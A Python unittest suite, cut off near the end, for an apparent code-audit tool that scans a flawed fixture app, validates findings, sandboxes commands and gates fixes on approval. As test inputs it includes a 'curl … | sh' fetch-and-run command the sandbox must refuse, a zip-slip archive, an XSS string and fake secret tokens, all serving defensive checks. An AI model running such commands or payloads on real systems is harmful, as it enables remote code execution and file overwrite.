#!/usr/bin/env python3
"""AISA test suite. Run:  python3 -m unittest discover -s tests -v   (from the skill root)"""
from __future__ import annotations

import json
import os
import shutil
import stat
import subprocess
import sys
import tempfile
import unittest
import zipfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
SCRIPTS = ROOT / "scripts"
FIXTURE = ROOT / "tests" / "fixtures" / "shopmate"
sys.path.insert(0, str(SCRIPTS))

import aisa_common as common  # noqa: E402
import findings as fnd  # noqa: E402
import scan_tools  # noqa: E402
import generate_report as gr  # noqa: E402
import remediation as rem  # noqa: E402
import secret_mask as sm  # noqa: E402
import scan_antislop as antislop  # noqa: E402


def run(script, *args, env=None, check=False):
    e = os.environ.copy()
    e.update(env or {})
    r = subprocess.run([sys.executable, str(SCRIPTS / script), *map(str, args)], capture_output=True, text=True, env=e)
    if check and r.returncode != 0:
        raise AssertionError(f"{script} failed ({r.returncode}):\n{r.stdout}\n{r.stderr}")
    return r


def load(p):
    return json.loads(Path(p).read_text())


def audited_workspace(tmp: Path) -> Path:
    ws = tmp / "ws"
    fixture = tmp / "fixture_shopmate"
    shutil.copytree(FIXTURE, fixture)

    app = fixture / "backend" / "app.py"
    source = app.read_text()
    runtime_secret = "sk_live_" + "51FakeFakeFakeFakeFake0000"
    source = source.replace(
        'STRIPE_KEY = "STRIPE_KEY_PLACEHOLDER"',
        f'STRIPE_KEY = "{runtime_secret}"'
    )
    app.write_text(source)

    run("intake.py", "--workspace", ws, "--path", fixture, check=True)
    run("run_scans.py", "--workspace", ws, check=True)
    return ws


class Base(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._td = tempfile.TemporaryDirectory()
        cls.tmp = Path(cls._td.name)
        cls.ws = audited_workspace(cls.tmp)
        cls.findings = load(cls.ws / "findings.json")["findings"]

    @classmethod
    def tearDownClass(cls):
        common.rmtree_force(cls._td.name)
        try:
            cls._td.cleanup()
        except OSError:
            pass

    def rules(self):
        return {f["source"]["rule_id"] for f in self.findings}


class TestIntentionalAbstractStubs(unittest.TestCase):
    def scan(self, source):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "sample.py").write_text(source)
            return antislop.scan_not_implemented(root)

    def test_abstractmethod_not_implemented_is_recognized_as_intentional(self):
        findings = self.scan(
            "from abc import ABC, abstractmethod\n"
            "class Adapter(ABC):\n"
            "    @abstractmethod\n"
            "    def run(self):\n"
            "        raise NotImplementedError\n"
        )
        self.assertEqual(findings, [])

    def test_protocol_method_not_implemented_is_recognized_as_intentional(self):
        findings = self.scan(
            "from typing import Protocol\n"
            "class Adapter(Protocol):\n"
            "    def run(self):\n"
            "        raise NotImplementedError\n"
        )
        self.assertEqual(findings, [])

    def test_concrete_method_on_abc_is_still_reported(self):
        findings = self.scan(
            "from abc import ABC, abstractmethod\n"
            "class Adapter(ABC):\n"
            "    @abstractmethod\n"
            "    def contract(self):\n"
            "        ...\n"
            "    def run(self):\n"
            "        raise NotImplementedError\n"
        )
        self.assertEqual(len(findings), 1)
        self.assertEqual(findings[0]["rule_id"], "SLOP-NOTIMPL")
        self.assertEqual(findings[0]["locations"], [{"file": "sample.py", "line": 7}])


class TestScanners(Base):
    def test_expected_rules_fire(self):
        expected = {"SQLI-PY", "PY-EVAL", "SECRET-PROVIDER", "ENV-COMMITTED", "PHANTOM-DEP-PY", "CLAIM-NO-EVIDENCE",
                    "API-NO-ROUTE", "PY-STUB", "PY-FAKE-ACTION", "SLOP-FAKE-ASYNC", "DUP-BLOCK", "DOCKER-ROOT", "CORS-WILD",
                    "DEBUG-ON", "XSS-SINK", "HARDCODED-LOGIN", "PY-SWALLOW", "PY-UNREACHABLE", "NO-TESTS", "SLOP-LOREM",
                    "SLOP-MOCK-DATA", "DEP-DEPRECATED", "SECRET-GENERIC"}
        self.assertFalse(expected - self.rules(), f"missing: {expected - self.rules()}")

    def test_secret_values_never_leak(self):
        blob = "".join(p.read_text() for p in self.ws.rglob("*.json") if "source" not in p.parts)
        blob += (self.ws / "reports").exists() and "" or ""
        for secret in ("sk_live_" + "51FakeFakeFakeFakeFake0000", "hunter2hunter2"):
            self.assertNotIn(secret, blob)

    def test_snapshot_untouched(self):
        self.assertEqual(run("verify_readonly.py", "--workspace", self.ws).returncode, 0)

    def test_pattern_hits_are_not_confirmed(self):
        for f in self.findings:
            if f["verification"]["method"] == "static-pattern":
                self.assertNotEqual(f["status"], "Confirmed", f["id"])

    def test_api_trace_detects_typo_route(self):
        api = load(self.ws / "scan" / "api_map.json")
        self.assertTrue(any(c["path"] == "/api/orders" for c in api["unmatched_calls"]))
        self.assertTrue(any(m["route"] == "/api/products" for m in api["matched"]))

    def test_clean_project_has_no_high_findings(self):
        clean = self.tmp / "clean"
        (clean / "tests").mkdir(parents=True)
        (clean / "README.md").write_text("# Clean\nA tiny library.\n")
        (clean / "LICENSE").write_text("MIT\n")
        (clean / ".gitignore").write_text(".env\n")
        (clean / "requirements.txt").write_text("requests==2.31.0\n")
        (clean / "lib.py").write_text('import json\n\n\ndef parse(text):\n    """Parse JSON."""\n    return json.loads(text)\n')
        (clean / "tests" / "test_lib.py").write_text("import lib\n\n\ndef test_parse():\n    assert lib.parse('1') == 1\n")
        ws = self.tmp / "ws_clean"
        run("intake.py", "--workspace", ws, "--path", clean, check=True)
        run("run_scans.py", "--workspace", ws, check=True)
        bad = [f for f in load(ws / "findings.json")["findings"] if f["severity"] in {"Critical", "High"}]
        self.assertEqual(bad, [], [f["title"] for f in bad])


class TestIntake(unittest.TestCase):
    def setUp(self):
        self.td = Path(tempfile.mkdtemp())

    def tearDown(self):
        common.rmtree_force(self.td)

    def test_zip_slip_rejected(self):
        z = self.td / "evil.zip"
        with zipfile.ZipFile(z, "w") as zf:
            zf.writestr("../../escape.txt", "x")
        r = run("intake.py", "--workspace", self.td / "ws", "--zip", z)
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("path traversal", r.stderr)
        self.assertFalse((self.td / "escape.txt").exists())

    def test_zip_single_root_flattened(self):
        z = self.td / "p.zip"
        with zipfile.ZipFile(z, "w") as zf:
            zf.writestr("proj/app.py", "print(1)\n")
            zf.writestr("proj/requirements.txt", "flask\n")
        run("intake.py", "--workspace", self.td / "ws", "--zip", z, check=True)
        self.assertTrue((self.td / "ws" / "source" / "app.py").exists())

    def test_one_project_per_workspace(self):
        a, b = self.td / "a", self.td / "b"
        for d in (a, b):
            d.mkdir()
            (d / "x.py").write_text("x=1\n")
        run("intake.py", "--workspace", self.td / "ws", "--path", a, check=True)
        r = run("intake.py", "--workspace", self.td / "ws", "--path", b)
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("exactly one project", r.stderr)

    def test_ambiguous_multi_project_flagged(self):
        for n in ("alpha", "beta"):
            (self.td / "m" / n).mkdir(parents=True)
            (self.td / "m" / n / "package.json").write_text("{}")
        r = run("intake.py", "--workspace", self.td / "ws", "--path", self.td / "m", check=True)
        self.assertIn("ACTION REQUIRED", r.stdout)

    def test_modification_is_detected(self):
        src = self.td / "p"
        src.mkdir()
        (src / "a.py").write_text("a=1\n")
        ws = self.td / "ws"
        run("intake.py", "--workspace", ws, "--path", src, check=True)
        target = ws / "source" / "a.py"
        os.chmod(target, stat.S_IRUSR | stat.S_IWUSR)
        target.write_text("a=2\n")
        self.assertEqual(run("verify_readonly.py", "--workspace", ws).returncode, 1)

    def test_github_url_validation(self):
        r = run("intake.py", "--workspace", self.td / "ws", "--github", "https://user:token@evil.example/x/y")
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("--github expects", r.stderr)


class TestFindingsIntegrity(Base):
    def fresh_ws(self):
        ws = self.tmp / f"ws_f_{os.urandom(3).hex()}"
        shutil.copytree(self.ws, ws, symlinks=True)
        common.make_writable(ws)
        return ws

    def fid(self, ws, rule):
        return next(f["id"] for f in load(ws / "findings.json")["findings"] if f["source"]["rule_id"] == rule)

    def test_validate_passes_on_scanner_output(self):
        self.assertEqual(run("findings.py", "--workspace", self.ws, "validate").returncode, 0)

    def test_confirm_with_pattern_method_rejected(self):
        ws = self.fresh_ws()
        r = run("findings.py", "--workspace", ws, "update", self.fid(ws, "PY-EVAL"), "--status", "Confirmed")
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("confirming method", r.stderr)

    def test_confirm_requires_notes_for_manual_read(self):
        ws = self.fresh_ws()
        fid = self.fid(ws, "PY-EVAL")
        r = run("findings.py", "--workspace", ws, "update", fid, "--status", "Confirmed", "--method", "manual-code-read")
        self.assertNotEqual(r.returncode, 0)
        r = run("findings.py", "--workspace", ws, "update", fid, "--status", "Confirmed", "--method", "manual-code-read",
                "--notes", "Read backend/app.py:48-51; expr comes straight from request.args and reaches eval()")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertEqual(next(f for f in load(ws / "findings.json")["findings"] if f["id"] == fid)["status"], "Confirmed")

    def test_fabricated_line_and_snippet_rejected(self):
        ws = self.fresh_ws()
        bad = {"domain": "SEC", "title": "Invented", "severity": "High", "status": "Potential", "explanation": "x", "impact": "x",
               "recommendation": "x", "locations": [{"file": "backend/app.py", "line": 9999}], "evidence": {"snippet": "nope"}}
        (ws / "bad.json").write_text(json.dumps(bad))
        r = run("findings.py", "--workspace", ws, "add", "--json", ws / "bad.json")
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("out of range", r.stderr)
        bad["locations"] = [{"file": "backend/missing.py", "line": 1}]
        (ws / "bad.json").write_text(json.dumps(bad))
        self.assertIn("does not exist", run("findings.py", "--workspace", ws, "add", "--json", ws / "bad.json").stderr)
        bad["locations"] = [{"file": "backend/app.py", "line": 3}]
        (ws / "bad.json").write_text(json.dumps(bad))
        self.assertIn("possible fabricated evidence", run("findings.py", "--workspace", ws, "add", "--json", ws / "bad.json").stderr)

    def test_valid_manual_finding_accepted(self):
        ws = self.fresh_ws()
        good = {"domain": "BIZ", "title": "Order total never validated", "severity": "Medium", "status": "Confirmed",
                "explanation": "qty can be negative", "impact": "negative totals", "recommendation": "validate qty",
                "locations": [{"file": "backend/app.py", "line": 72}], "evidence": {"snippet": "if i[\"qty\"] < 0:"},
                "verification": {"method": "manual-code-read", "notes": "Read validate_cart; negative qty returns False but exception path returns True"}}
        (ws / "good.json").write_text(json.dumps(good))
        r = run("findings.py", "--workspace", ws, "add", "--json", ws / "good.json")
        self.assertEqual(r.returncode, 0, r.stderr)
        self.assertIn("AISA-BIZ-001", r.stdout)

    def test_not_applicable_needs_reason(self):
        ws = self.fresh_ws()
        fid = self.fid(ws, "PY-EVAL")
        self.assertNotEqual(run("findings.py", "--workspace", ws, "update", fid, "--status", "Not Applicable").returncode, 0)
        self.assertEqual(run("findings.py", "--workspace", ws, "update", fid, "--status", "Not Applicable", "--notes", "eval of constant").returncode, 0)

    def test_merge_preserves_duplicate_scanner_evidence_and_provenance(self):
        ws = self.fresh_ws()
        scan_dir = ws / "scan"
        source_path = next(p for p in sorted(scan_dir.glob("*.json"))
                           if isinstance(load(p), dict) and load(p).get("candidates"))
        source_data = load(source_path)
        candidate = json.loads(json.dumps(source_data["candidates"][0]))
        secondary = {"scanner": "secondary-test-scanner", "tools": {}, "candidates": [candidate]}
        candidate["tool"] = "secondary-test-tool"
        (scan_dir / "secondary-test.json").write_text(json.dumps(secondary))

        run("findings.py", "--workspace", ws, "merge", check=True)
        stored = load(ws / "findings.json")["findings"]
        match = next(f for f in stored if f["fingerprint"] == fnd.fingerprint(candidate))
        self.assertEqual(len([f for f in stored if f["fingerprint"] == match["fingerprint"]]), 1)
        secondary_source = next(s for s in match["evidence_sources"]
                                if s["scanner"] == "secondary-test-scanner")
        self.assertEqual(secondary_source["tool"], "secondary-test-tool")
        self.assertEqual(secondary_source["rule_id"], candidate["rule_id"])
        self.assertTrue(secondary_source["evidence"]["snippet"] or secondary_source["evidence"]["details"])

    def test_merge_duplicate_evidence_is_idempotent(self):
        ws = self.fresh_ws()
        scan_dir = ws / "scan"
        source_path = next(p for p in sorted(scan_dir.glob("*.json"))
                           if isinstance(load(p), dict) and load(p).get("candidates"))
        candidate = json.loads(json.dumps(load(source_path)["candidates"][0]))
        candidate["tool"] = "secondary-test-tool"
        (scan_dir / "secondary-test.json").write_text(json.dumps({
            "scanner": "secondary-test-scanner", "tools": {}, "candidates": [candidate]}))
        run("findings.py", "--workspace", ws, "merge", check=True)
        first = load(ws / "findings.json")["findings"]
        match = next(f for f in first if f["fingerprint"] == fnd.fingerprint(candidate))
        sources_before = json.dumps(match["evidence_sources"], sort_keys=True)
        run("findings.py", "--workspace", ws, "merge", check=True)
        second = load(ws / "findings.json")["findings"]
        match_after = next(f for f in second if f["fingerprint"] == fnd.fingerprint(candidate))
        self.assertEqual(json.dumps(match_after["evidence_sources"], sort_keys=True), sources_before)

    def test_merge_persists_stable_root_cause_groups(self):
        ws = self.fresh_ws()
        run("findings.py", "--workspace", ws, "merge", check=True)
        first = load(ws / "findings.json")
        expected = fnd.build_root_cause_groups(first["findings"])
        self.assertEqual(first["root_cause_groups"], expected)
        run("findings.py", "--workspace", ws, "merge", check=True)
        second = load(ws / "findings.json")
        self.assertEqual(second["root_cause_groups"], expected)

    def test_merge_idempotent(self):
        ws = self.fresh_ws()
        n = len(load(ws / "findings.json")["findings"])
        run("findings.py", "--workspace", ws, "merge", check=True)
        self.assertEqual(len(load(ws / "findings.json")["findings"]), n)


    def test_normalized_identity_ignores_scanner_rule_and_title_prefix(self):
        first = {"domain": "SEC", "rule_id": "BANDIT-B301", "title": "bandit: possible eval",
                 "locations": [{"file": "backend\\app.py", "line": 12}],
                 "evidence": "value = eval(user_input)", "verbatim": True}
        second = {"domain": "sec", "rule_id": "SEMGREP-python.lang.security.audit.eval-detected",
                  "title": "semgrep: eval of untrusted input",
                  "locations": [{"file": "backend/app.py", "line": 12}],
                  "evidence": "value = eval(user_input)", "verbatim": True}
        self.assertEqual(fnd.normalized_identity(first), fnd.normalized_identity(second))
        second["locations"] = [{"file": "backend/app.py", "line": 13}]
        self.assertNotEqual(fnd.normalized_identity(first), fnd.normalized_identity(second))

    def test_merge_deduplicates_across_different_scanner_rules(self):
        ws = self.fresh_ws()
        scan_dir = self.tmp / f"normalised_scans_{os.urandom(3).hex()}"
        scan_dir.mkdir()
        first = {
            "domain": "SEC", "rule_id": "BANDIT-B301", "severity": "Medium", "status": "Potential",
            "title": "bandit: possible eval", "locations": [{"file": "backend/app.py", "line": 12}],
            "evidence": "value = eval(user_input)", "verbatim": True, "masked": False,
            "explanation": "Scanner A report", "impact": "Untrusted input may execute",
            "recommendation": "Validate input", "references": [], "tool": "bandit", "method": "tool-reported",
        }
        second = dict(first, rule_id="SEMGREP-EVAL", title="semgrep: eval of untrusted input", tool="semgrep")
        (scan_dir / "a.json").write_text(json.dumps({"scanner": "scanner-a", "candidates": [first]}))
        (scan_dir / "b.json").write_text(json.dumps({"scanner": "scanner-b", "candidates": [second]}))

        run("findings.py", "--workspace", ws, "merge", "--scan-dir", scan_dir, check=True)
        stored = load(ws / "findings.json")["findings"]
        matches = [item for item in stored if item.get("identity_key") == fnd.normalized_identity(first)]
        self.assertEqual(len(matches), 1)
        self.assertEqual(len(matches[0]["evidence_sources"]), 2)
        self.assertEqual(matches[0]["source"]["rule_id"], "BANDIT-B301")

    def test_merge_reconstructs_identity_for_legacy_finding(self):
        ws = self.fresh_ws()
        scan_dir = self.tmp / f"legacy_identity_scans_{os.urandom(3).hex()}"
        scan_dir.mkdir()
        candidate = {
            "domain": "SEC", "rule_id": "BANDIT-B301", "severity": "Medium", "status": "Potential",
            "title": "bandit: possible eval", "locations": [{"file": "backend/app.py", "line": 12}],
            "evidence": "value = eval(user_input)", "verbatim": True, "masked": False,
            "explanation": "Scanner report", "impact": "Untrusted input may execute",
            "recommendation": "Validate input", "references": [], "tool": "bandit", "method": "tool-reported",
        }
        (scan_dir / "a.json").write_text(json.dumps({"scanner": "scanner-a", "candidates": [candidate]}))
        run("findings.py", "--workspace", ws, "merge", "--scan-dir", scan_dir, check=True)
        store_path = ws / "findings.json"
        data = load(store_path)
        target = next(item for item in data["findings"] if item.get("identity_key") == fnd.normalized_identity(candidate))
        target.pop("identity_key")
        store_path.write_text(json.dumps(data))
        second = dict(candidate, rule_id="SEMGREP-EVAL", title="semgrep: eval of untrusted input", tool="semgrep")
        (scan_dir / "b.json").write_text(json.dumps({"scanner": "scanner-b", "candidates": [second]}))
        run("findings.py", "--workspace", ws, "merge", "--scan-dir", scan_dir, check=True)
        final = load(store_path)["findings"]
        matches = [item for item in final if item.get("identity_key") == fnd.normalized_identity(candidate)]
        self.assertEqual(len(matches), 1)
        self.assertEqual(len(matches[0]["evidence_sources"]), 2)


class TestRootCauseGrouping(unittest.TestCase):
    def finding(self, fid, domain="SEC", locations=None):
        return {"id": fid, "domain": domain, "locations": locations or []}

    def test_groups_same_domain_overlapping_ranges_only(self):
        findings = [
            self.finding("AISA-SEC-001", locations=[{"file": "src/app.py", "line": 10, "end_line": 14}]),
            self.finding("AISA-SEC-002", locations=[{"file": "src/app.py", "line": 14, "end_line": 18}]),
            self.finding("AISA-SEC-003", locations=[{"file": "src/app.py", "line": 19}]),
            self.finding("AISA-LOG-001", domain="LOG", locations=[{"file": "src/app.py", "line": 12}]),
            self.finding("AISA-SEC-004", locations=[{"file": "other.py", "line": 12}]),
            self.finding("AISA-SEC-005", locations=[{"file": "src/app.py"}]),
        ]
        groups = fnd.build_root_cause_groups(findings)
        self.assertEqual(len(groups), 1)
        self.assertEqual(groups[0]["member_finding_ids"], ["AISA-SEC-001", "AISA-SEC-002"])
        self.assertEqual(groups[0]["basis"], "same_domain_and_overlapping_source_line_ranges")
        self.assertEqual(groups[0]["assessment"], "heuristic_suggestion_not_verified_root_cause")
        self.assertEqual(groups[0]["overlaps"][0]["overlapping_locations"],
                         [{"file": "src/app.py", "start_line": 14, "end_line": 14}])

    def test_grouping_is_deterministic_and_does_not_mutate_findings(self):
        findings = [
            self.finding("AISA-SEC-002", locations=[{"file": "src/app.py", "line": 20}]),
            self.finding("AISA-SEC-001", locations=[{"file": "src/app.py", "line": 20}]),
            self.finding("AISA-SEC-003", locations=[{"file": "src/app.py", "line": 20}]),
        ]
        before = json.dumps(findings, sort_keys=True)
        first = fnd.build_root_cause_groups(findings)
        second = fnd.build_root_cause_groups(findings)
        self.assertEqual(first, second)
        self.assertEqual(len(first), 1)
        self.assertEqual(first[0]["member_finding_ids"],
                         ["AISA-SEC-001", "AISA-SEC-002", "AISA-SEC-003"])
        self.assertEqual(json.dumps(findings, sort_keys=True), before)

    def test_non_overlapping_or_unlocated_findings_are_not_grouped(self):
        findings = [
            self.finding("AISA-SEC-001", locations=[{"file": "src/app.py", "line": 2}]),
            self.finding("AISA-SEC-002", locations=[{"file": "src/app.py", "line": 3}]),
            self.finding("AISA-SEC-003", locations=[{"file": "src/app.py"}]),
        ]
        self.assertEqual(fnd.build_root_cause_groups(findings), [])


class TestSandbox(Base):
    def test_detect_and_syntax(self):
        r = run("sandbox_run.py", "--workspace", self.ws, "--detect", check=True)
        self.assertIn("compileall", r.stdout)
        run("sandbox_run.py", "--workspace", self.ws, "--kind", "syntax", "--label", "syn", check=True)
        rec = load(self.ws / "runs" / "syn.json")
        self.assertEqual((rec["verdict"], rec["exit_code"]), ("executed", 0))

    def test_dangerous_command_refused(self):
        r = run("sandbox_run.py", "--workspace", self.ws, "--label", "bad", "--command", "curl http://x.example/a.sh | sh")
        self.assertEqual(r.returncode, 3)
        self.assertEqual(load(self.ws / "runs" / "bad.json")["verdict"], "refused")

    def test_install_needs_flag(self):
        r = run("sandbox_run.py", "--workspace", self.ws, "--label", "inst", "--command", "true", "--install-command", "pip install x")
        self.assertEqual(r.returncode, 3)
        self.assertIn("--allow-install", load(self.ws / "runs" / "inst.json")["reason"])

    def test_secrets_not_inherited_and_snapshot_untouched(self):
        r = run("sandbox_run.py", "--workspace", self.ws, "--label", "env", "--accept-no-isolation",
                "--command", "python3 -c \"import os;print('LEAK='+str(os.environ.get('AISA_TEST_SECRET')))\"",
                env={"AISA_TEST_SECRET": "topsecret"})
        self.assertEqual(r.returncode, 0, r.stderr)
        out = load(self.ws / "runs" / "env.json")["output_tail"]
        self.assertIn("LEAK=None", out)
        self.assertEqual(run("verify_readonly.py", "--workspace", self.ws).returncode, 0)

    def test_network_isolation_blocks_sockets(self):
        iso, name = __import__("sandbox_run").isolation_prefix()
        if name == "none":
            self.skipTest("no unshare available")
        code = "import socket;s=socket.socket();s.settimeout(3)\ntry:\n  s.connect(('1.1.1.1',53));print('NET=open')\nexcept OSError:\n  print('NET=blocked')"
        run("sandbox_run.py", "--workspace", self.ws, "--label", "net", "--command", f"python3 -c \"{code}\"", check=True)
        self.assertIn("NET=blocked", load(self.ws / "runs" / "net.json")["output_tail"])

    def test_runs_project_tests_and_counts(self):
        proj = self.tmp / "tp"
        proj.mkdir()
        (proj / "m.py").write_text("def add(a, b):\n    return a + b\n")
        (proj / "test_m.py").write_text("import unittest, m\nclass T(unittest.TestCase):\n    def test_add(self):\n        self.assertEqual(m.add(1, 2), 3)\n    def test_bad(self):\n        self.assertEqual(m.add(1, 1), 3)\n")
        ws = self.tmp / "ws_tp"
        run("intake.py", "--workspace", ws, "--path", proj, check=True)
        run("sandbox_run.py", "--workspace", ws, "--label", "t", "--accept-no-isolation", "--command", "python3 -m unittest -v", check=True)
        rec = load(ws / "runs" / "t.json")
        self.assertEqual(rec["counts"].get("ran"), 2)
        self.assertNotEqual(rec["exit_code"], 0)


class TestToolBridges(unittest.TestCase):
    def test_parsers_on_documented_shapes(self):
        src = Path("/tmp/proj")
        b = scan_tools.parse_bandit({"results": [{"test_id": "B602", "test_name": "x", "issue_severity": "HIGH", "issue_confidence": "HIGH",
                                                  "issue_text": "shell=True", "filename": "/tmp/proj/a.py", "line_number": 3, "code": "os.system(x)",
                                                  "issue_cwe": {"id": 78}}]}, src)
        self.assertEqual((b[0]["severity"], b[0]["locations"][0]["file"], b[0]["references"]), ("High", "a.py", ["CWE-78"]))
        s = scan_tools.parse_semgrep({"results": [{"check_id": "a.b.rule", "path": "/tmp/proj/x.js", "start": {"line": 7},
                                                   "extra": {"message": "bad", "severity": "ERROR", "lines": "eval(x)", "metadata": {"cwe": ["CWE-95: Eval"]}}}]}, src)
        self.assertEqual((s[0]["severity"], s[0]["locations"][0]["line"]), ("High", 7))
        r = scan_tools.parse_ruff([{"code": "F821", "message": "undefined name", "filename": "/tmp/proj/z.py", "location": {"row": 2, "column": 1}}], src)
        self.assertEqual(r[0]["severity"], "High")
        for c in b + s + r:
            self.assertEqual(c["status"], "Potential")

    def test_gitleaks_bridge_with_fake_binary_masks_secret(self):
        td = Path(tempfile.mkdtemp())
        try:
            (td / "bin").mkdir()
            fake = td / "bin" / "gitleaks"
            fake.write_text('#!/bin/sh\nrp=""\nwhile [ $# -gt 0 ]; do [ "$1" = "--report-path" ] && rp="$2"; shift; done\n'
                            'echo \'[{"RuleID":"aws-key","Description":"AWS key","File":"SRC/a.py","StartLine":4,"Secret":"AKIAABCDEFGHIJKLMNOP"}]\' > "$rp"\n')
            fake.chmod(0o755)
            src = td / "SRC"
            src.mkdir()
            (src / "a.py").write_text("x=1\n")
            old = os.environ["PATH"]
            os.environ["PATH"] = f"{td / 'bin'}:{old}"
            try:
                import scan_secrets
                out, status = scan_secrets.run_gitleaks(src, False)
            finally:
                os.environ["PATH"] = old
            self.assertTrue(status.startswith("used"))
            self.assertNotIn("AKIAABCDEFGHIJKLMNOP", json.dumps(out))
        finally:
            common.rmtree_force(td)


class TestRemediationAndReport(Base):
    def setUp(self):
        self.w = self.tmp / f"ws_r_{os.urandom(3).hex()}"
        shutil.copytree(self.ws, self.w, symlinks=True)
        common.make_writable(self.w)
        common.make_readonly(self.w / "source")

    def rid(self, rule):
        return next(f["id"] for f in load(self.w / "findings.json")["findings"] if f["source"]["rule_id"] == rule)

    def test_nothing_happens_without_approval(self):
        for cmd in (["init"], ["record", "--id", "AISA-SEC-001", "--files", "a", "--description", "d"], ["diff"], ["validate"]):
            r = run("remediation.py", "--workspace", self.w, *cmd)
            self.assertNotEqual(r.returncode, 0)
            self.assertIn("NO APPROVAL", r.stderr)

    def test_unapproved_finding_cannot_be_recorded(self):
        run("remediation.py", "--workspace", self.w, "approve", "--ids", self.rid("PY-EVAL"), "--statement", "user: fix eval", check=True)
        r = run("remediation.py", "--workspace", self.w, "record", "--id", self.rid("SQLI-PY"), "--files", "backend/app.py", "--description", "x")
        self.assertNotEqual(r.returncode, 0)
        self.assertIn("not approved", r.stderr)

    def test_full_cycle_fix_validate_apply(self):
        ev = self.rid("PY-EVAL")
        run("remediation.py", "--workspace", self.w, "approve", "--ids", ev, "--statement", "user: please fix the eval", check=True)
        run("remediation.py", "--workspace", self.w, "init", check=True)
        target = self.w / "remediation" / "work" / "backend" / "app.py"
        text = target.read_text().replace('jsonify({"result": eval(expr)})', 'jsonify({"result": float(expr)})')
        target.write_text(text)
        run("remediation.py", "--workspace", self.w, "record", "--id", ev, "--files", "backend/app.py", "--description", "removed eval", check=True)
        run("remediation.py", "--workspace", self.w, "diff", check=True)
        patch = (self.w / "remediation" / "patches" / "aisa-remediation.patch").read_text()
        self.assertIn("-    return jsonify({\"result\": eval(expr)})", patch)
        v = run("remediation.py", "--workspace", self.w, "validate")
        val = load(self.w / "remediation" / "validation.json")
        self.assertEqual(v.returncode, 0, v.stdout + v.stderr)
        self.assertEqual(val["verdict"], "PASS")
        self.assertIn(ev, val["before_after"]["resolved"])
        self.assertEqual(val["before_after"]["new_regressions"], [])
        # snapshot untouched
        self.assertEqual(run("verify_readonly.py", "--workspace", self.w).returncode, 0)
        # apply to a copy of the original project
        copy = self.tmp / f"checkout_{os.urandom(3).hex()}"
        shutil.copytree(FIXTURE, copy)
        r = run("remediation.py", "--workspace", self.w, "apply-to", "--target", copy)
        self.assertNotEqual(r.returncode, 0)  # needs --confirm
        run("remediation.py", "--workspace", self.w, "apply-to", "--target", copy, "--confirm", check=True)
        self.assertNotIn("eval(expr)", (copy / "backend" / "app.py").read_text())

    def test_regression_is_detected(self):
        ev = self.rid("PY-EVAL")
        run("remediation.py", "--workspace", self.w, "approve", "--ids", ev, "--statement", "user: fix eval", check=True)
        run("remediation.py", "--workspace", self.w, "init", check=True)
        target = self.w / "remediation" / "work" / "backend" / "app.py"
        target.write_text(target.read_text().replace("eval(expr)", "exec(expr)"))  # 'fix' that is still dangerous
        run("remediation.py", "--workspace", self.w, "record", "--id", ev, "--files", "backend/app.py", "--description", "bogus fix", check=True)
        v = run("remediation.py", "--workspace", self.w, "validate")
        self.assertEqual(v.returncode, 1)
        self.assertEqual(load(self.w / "remediation" / "validation.json")["verdict"], "FAIL")

    def test_report_has_17_sections_and_escapes_html(self):
        r = run("generate_report.py", "--workspace", self.w, check=True)
        md = (self.w / "reports" / "aisa-report.md").read_text()
        for n in range(1, 18):
            self.assertIn(f"## {n}. ", md)
        store = load(self.w / "findings.json")
        store["findings"][0]["title"] = "<script>alert(1)</script>"
        (self.w / "findings.json").write_text(json.dumps(store))
        run("generate_report.py", "--workspace", self.w, check=True)
        page = (self.w / "reports" / "aisa-report.html").read_text()
        self.assertNotIn("<script>alert(1)</script>", page)

    def test_report_refused_on_fabricated_evidence(self):
        store = load(self.w / "findings.json")
        store["findings"][0]["locations"] = [{"file": "ghost.py", "line": 1}]
        (self.w / "findings.json").write_text(json.dumps(store))
        r = run("generate_report.py", "--workspace", self.w)
        self.assertEqual(r.returncode, 3)
        self.assertIn("REPORT REFUSED", r.stdout)

    def test_unproven_feature_and_contradictory_readiness_refused(self):
        (self.w / "features.json").write_text(json.dumps({"features": [
            {"feature": "Checkout", "result": "Verified Working", "method": "manual-code-read"}]}))
        r = run("generate_report.py", "--workspace", self.w)
        self.assertEqual(r.returncode, 3)
        (self.w / "features.json").unlink()
        ev = self.rid("PY-EVAL")
        run("findings.py", "--workspace", self.w, "update", ev, "--status", "Confirmed", "--method", "manual-code-read", "--notes", "read app.py:51", check=True)
        (self.w / "narrative.json").write_text(json.dumps({"production_readiness": {"verdict": "Ready", "rationale": "x"}}))
        r = run("generate_report.py", "--workspace", self.w)
        self.assertEqual(r.returncode, 3)
        self.assertIn("contradicts", r.stdout)


RUNTIME_SECRET = "sk_live_" + "51FakeFakeFakeFakeFake0000"  # the value audited_workspace() plants on line 12 of app.py


def synthetic():
    return {"token": "gh" + "p_" + "a1B2c3D4" * 5, "password": "Zq9" + "mK2vR7" + "tLp4Xw", "dsn_password": "Vb8" + "nH3cF6" + "jQ1sY"}


class NoLeak:
    def assertNoLeak(self, haystack, where, extra=None):
        for name, value in {**synthetic(), **(extra or {})}.items():
            if value in haystack:
                self.fail(f"synthetic secret '{name}' leaked in {where}")  # never print the value itself


MANUAL = {"domain": "BIZ", "title": "Cart validation swallows errors", "severity": "Medium", "status": "Confirmed",
          "explanation": "a bare except hides failures", "impact": "invalid carts pass", "recommendation": "catch specific exceptions",
          "locations": [{"file": "backend/app.py", "line": 72}], "evidence": {"snippet": 'if i["qty"] < 0:'},
          "verification": {"method": "manual-code-read", "notes": "Read validate_cart in backend/app.py"}}


# ----------------------------------------------------------------------------- A. evidence range

class TestEvidenceRange(unittest.TestCase):
    SRC = "a = 1\nb = 2\nresult = compute(\n    alpha,\n    beta,\n)\nc = 3\n"

    def setUp(self):
        self.td = Path(tempfile.mkdtemp())
        (self.td / "m.py").write_text(self.SRC)

    def tearDown(self):
        common.rmtree_force(self.td)

    def finding(self, locations, snippet, masked=False):
        return {"id": "AISA-LOG-001", "domain": "LOG", "title": "t", "severity": "Low", "status": "Potential", "locations": locations,
                "evidence": {"snippet": snippet, "details": "", "masked": masked}, "explanation": "x", "impact": "x", "recommendation": "x",
